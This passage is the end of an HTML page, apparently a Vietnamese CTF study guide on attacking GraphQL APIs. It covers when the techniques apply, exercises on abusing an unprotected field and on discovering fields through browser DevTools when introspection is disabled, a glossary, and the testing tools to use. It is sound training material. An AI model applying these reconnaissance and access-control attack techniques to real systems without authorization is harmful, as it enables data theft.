+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App có endpoint GraphQL thật (xác nhận bằng body <code>{"query": ...}</code> tới 1 URL duy nhất).</td></tr>
+    <tr><td>❌</td><td>App REST thông thường nhưng tên endpoint tình cờ chứa "graphql" (hiếm, nhưng luôn xác nhận lại bằng introspection trước khi đầu tư thời gian).</td></tr>
+    <tr><td>❌</td><td>Introspection VÀ field suggestion đều tắt, không đoán được tên field nào hợp lệ — vẫn có thể có lỗ hổng access control nhưng không tìm ra được field để thử (giới hạn thực tế, không phải "an toàn tuyệt đối").</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 GraphQL server nhỏ (thư viện <code>graphene</code> cho Python hoặc
+  <code>Apollo Server</code> cho Node) với introspection bật, tự chạy introspection query lấy schema.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>pip install graphene flask flask-graphql</code> là cách nhanh
+  nhất dựng server test cho Python.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thêm 1 field <code>secretNotes</code> vào Type <code>User</code> không
+  check quyền gì, tự khai thác lấy giá trị field đó bằng user thường.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Field tồn tại trong schema là đủ để query được, GraphQL không tự
+  động áp bất kỳ quyền nào trừ khi resolver code tự viết check.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app tắt cả introspection và field suggestion. Thiết kế cách bạn vẫn có thể
+  tìm ra tên field/query hợp lệ chỉ bằng cách quan sát hành vi UI (network tab của trình duyệt) mà không cần
+  bất kỳ công cụ GraphQL chuyên dụng nào.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Mở DevTools Network tab, duyệt qua MỌI trang/chức năng trên UI thật
+  của app — mỗi lần UI gọi GraphQL, bạn thấy đúng query/mutation thật kèm field thật đang được dùng, không cần
+  đoán.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Introspection</td><td>Tính năng GraphQL tự trả về toàn bộ schema của chính nó khi được hỏi.</td></tr>
+    <tr><td>Resolver</td><td>Hàm code thực sự chạy để lấy dữ liệu cho 1 field cụ thể khi được query.</td></tr>
+    <tr><td>Batching</td><td>Gửi nhiều query/mutation trong 1 request HTTP duy nhất.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/clairvoyance/</code>,
+  <code>~/hoc/CTF/Tools/web/graphql-cop/</code>, Burp extension InQL (cần cài qua BApp Store trước ngày thi).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("gql-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("gql-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
